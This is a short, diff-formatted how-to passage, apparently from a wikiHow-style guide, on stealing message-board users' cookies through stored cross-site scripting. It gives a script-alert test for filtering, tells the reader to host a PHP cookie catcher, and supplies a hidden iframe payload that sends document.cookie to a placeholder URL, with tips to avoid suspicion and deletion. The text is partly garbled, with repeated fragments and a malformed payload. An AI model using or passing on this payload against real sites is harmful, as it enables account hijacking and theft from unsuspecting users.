@@ -1,0 +1,18 @@
+ A message board is a good example. Remember, if the site is secure then this will not work. window.alert(“test”) window.alert(“test”)window.alert(“test”);
+, You will need to type some special code into the “post” which will capture the data of all who click on it.
+
+
+You’ll want to test to see if the system filters out code. Post
+
+<script>window.alert(“test”)</script>
+
+If an alert box appears when you click on your post, then the site is vulnerable to attack.
+ The goal of this attack is to capture a user’s cookies, which allows you access to their account for websites with vulnerable logins. You’ll need a cookie catcher, which will capture your target’s cookies and reroute them. Upload the catcher to a website you have access to and that supports php. An example cookie catcher code can be found in the sample section.
+ Input a proper code into the post which will capture the cookies and sent them to your site. You will want to put in some text after the code to reduce suspicion and keep your post from being deleted.
+
+
+An example code would look like<iframe frameborder="0" height="0" width="0" src="javascript...:void(document.location='YOURURL/cookiecatcher.php?c=' document.cookie)></iframe>
+
+
+, After this, you can use the cookie information, which should be saved to your website, for whatever purpose you need.
+
